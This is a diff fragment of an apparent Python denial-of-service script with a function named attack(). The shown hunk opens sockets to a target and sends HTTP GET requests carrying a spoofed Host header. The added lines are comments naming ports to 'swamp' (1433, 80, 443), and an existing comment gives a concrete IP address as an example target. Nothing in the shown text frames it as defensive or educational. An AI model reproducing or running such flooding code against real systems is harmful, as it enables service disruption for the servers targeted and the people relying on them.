@@ -13,6 +13,8 @@ def attack():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
         #example 154.0.172.181:80 should also be alive
+        #port 1433 TC/UDP swamp
+        #port 80 or 443 for http/ https
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         #s.sendto(("POST /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
